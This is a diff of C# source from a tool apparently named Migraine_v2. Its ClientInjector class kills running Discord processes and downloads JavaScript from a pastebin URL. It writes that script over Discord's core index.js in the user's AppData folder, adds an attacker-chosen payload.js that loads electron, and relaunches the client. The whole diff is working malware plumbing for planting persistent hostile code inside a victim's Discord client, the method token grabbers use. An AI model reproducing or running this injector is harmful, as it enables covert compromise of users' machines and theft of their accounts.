@@ -1,14 +1,14 @@
-﻿using Migraine_v2.Client.Asar_Extraction;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
 using System.Linq;
 using System.Management;
+using System.Net;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Migraine_v2.Client
+namespace Migraine_v2.DClient
 {
     public class ClientInjector
     {
@@ -22,19 +22,27 @@ namespace Migraine_v2.Client
                 Inject();
             }
         }
-        public bool Inject()
+        public bool Inject(bool Restart = true)
         {
             try 
             {
-                var Process = GetDiscordProcesses();
-                var path = Path.Combine(Path.GetDirectoryName(GetProcessPath(Process.First().Id)), "resources");
-                if (Settings.KillDiscord) Process.ForEach(x => x.Kill());
-                ExtractAsar(Path.Combine(path, "app.asar"), Path.Combine(path, "app"));
-                File.Move(Path.Combine(path, "app.asar"), Path.Combine(path, "original_app.asar"));
-                string Index = Path.Combine(Path.Combine(path, "app"), "index.js");
-                string Contents = File.ReadAllText(Index);
-                Contents = Contents.Replace("mainWindow.webContents.on('dom-ready', function () {});", Settings.Payload);
-                File.WriteAllText(Index, Contents);
+                var _Process = GetDiscordProcesses();
+                var DriveLetter = GetDriveInfo(new FileInfo(GetProcessPath(_Process[0].Id)));
+                var CanaryVersion = "0.0.263";
+                var DiscordVersion = "0.0.306";
+                var path = _Process.First().ProcessName.Contains("Canary") ? $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\discordcanary\\{CanaryVersion}\\modules\\discord_desktop_core" : $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Roaming\\\\Discord\\{DiscordVersion}\\modules\\discord_desktop_core";
+                if (Settings.KillDiscord) _Process.ForEach(x => x.Kill());
+                var InjectionCode = new WebClient().DownloadString("https://pastebin.com/raw/BcNtAqtQ");
+                var Branch = _Process.First().ProcessName.Contains("Canary") ? "discordcanary" : "Discord";
+                var BranchVersion = Branch == "discordcanary" ? CanaryVersion : DiscordVersion;
+                var DiscordPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\Discord\\app-{DiscordVersion}\\Discord.exe";
+                var DiscordCanaryPath = $"{DriveLetter}\\Users\\{Environment.UserName}\\AppData\\Local\\DiscordCanary\\app-{CanaryVersion}\\DiscordCanary.exe";
+                var FixedDirectoryOfInjection = DriveLetter + @"\Users\\" + Environment.UserName + @"\\AppData\\Roaming\\\\" + Branch + @"\\" + BranchVersion + @"\\modules\\discord_desktop_core";
+                InjectionCode = InjectionCode.Replace("directoryofinjection", FixedDirectoryOfInjection + @"\\Migraine");
+                Directory.CreateDirectory($"{path}\\Migraine");
+                File.WriteAllText($"{path}\\index.js", InjectionCode);
+                File.WriteAllText($"{path}\\Migraine\\payload.js", Settings.Payload);
+                if (Restart) Process.Start(Branch == "discordcanary" ? DiscordCanaryPath : DiscordPath);
                 return true;
             }
             catch(Exception)
@@ -42,12 +50,10 @@ namespace Migraine_v2.Client
                 return false;
             }
         }
-        private bool ExtractAsar(string input, string output)
-        {
-            AsarArchive archive = new AsarArchive(input);
-            AsarExtractor extractor = new AsarExtractor();
 
-            return extractor.ExtractAll(archive, output, false);
+        private static DriveInfo GetDriveInfo(FileInfo file)
+        {
+            return new DriveInfo(file.Directory.Root.FullName);
         }
 
         private List<Process> GetDiscordProcesses()
@@ -78,7 +84,7 @@ namespace Migraine_v2.Client
         public Injection(bool kill, string code, bool executeOnLoad)
         {
             KillDiscord = kill;
-            Payload = code;
+            Payload = $"const electron = require('electron');\nconst currentWindow = electron.remote.getCurrentWindow();\nif (currentWindow.__preload) require(currentWindow.__preload);\n\n{code}";
             ExecuteOnLoad = executeOnLoad;
         }
     }
